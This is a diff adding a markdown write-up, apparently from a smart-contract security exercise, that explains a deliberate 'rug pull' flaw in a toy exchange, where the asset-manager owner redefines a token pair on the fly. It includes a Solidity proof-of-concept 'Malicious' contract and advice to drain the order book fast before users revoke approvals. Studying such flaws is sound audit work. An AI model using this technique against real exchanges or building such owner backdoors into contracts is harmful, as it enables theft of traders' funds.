@@ -1,0 +1,50 @@
+# Pulling the rug
+
+The exchange itself does not contain any (intentional) errors (there may well be errors in the way buy/sell directions for pairs are implemented due to lack of testing, if so, please ignore them).
+
+However, it relies opon an external contract to maintain asset pair mappings. 
+
+At a glance, this is fine:
+- The central DEX itself has no owner or privileged methods (only a public method to send accumulated funds to deployer). 
+- The asset-manager owner can disable an asset pair, which is a reasonable failsafe for compromised assets, 
+- The exchange itself can handle when an asset pair is disabled (orders simply fail, no observable side-effects other than some lost gas), 
+- Owner cannot overwrite an existing asset pair (well...). 
+
+However, in reality the owner can `remove` + `enroll` in one go, to on-the-fly redefine a pair. After initalizing the exchange + asset manager, the owner can change ownership to his
+malicious contract (proof of concept code further down). 
+
+Let's say there's an order to "Sell 100 WETH for 100 USDT". This means that the maker has authorized the dex to transfer (at least) `100 WETH` on his behalf. So what we do is: 
+- Change the "WETH/USDT" so "USDT" resolves to some dummy-token "DUM" where operator has infinite balance. 
+- Purchase 100 WETH for 100 DUM. 
+- Restore the asset pair (optional) 
+  - However, once people start noticing the drain, they will remove their authorizations, so it might be better to not restore it, but just go all-out and take the orders in larger batches as fast as possible. 
+
+```
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity >=0.7.0 <0.9.0;
+
+import "AssetManager.sol";
+import "SimpEX.sol";
+
+contract Malicious is Ownable{
+    
+    function doAttack(address assetMgr, address alpha,  address beta,  string calldata assetPair, address simpEx, bytes32 orderId) public onlyOwner{
+        AssetMgr mgr = AssetMgr(assetMgr);
+        // store the previous asset
+        (, address pAlpha, address pBeta) = mgr.getAsset(assetPair);
+        // set the new mapping
+        mgr.removeAsset(assetPair);
+        mgr.enrollAsset(alpha, beta, assetPair);
+
+        // Now execute the order
+        // swap.take(...)
+        SimpEX(simpEx).take(orderId);
+
+        // restore
+        mgr.removeAsset(assetPair);
+        mgr.enrollAsset(pAlpha, pBeta, assetPair);
+    }
+
+}```
+
+In effect: the malicious operator can drain the entire order-book, both buy and sell-side, by taking all orders and exchanging with DUM tokens. 
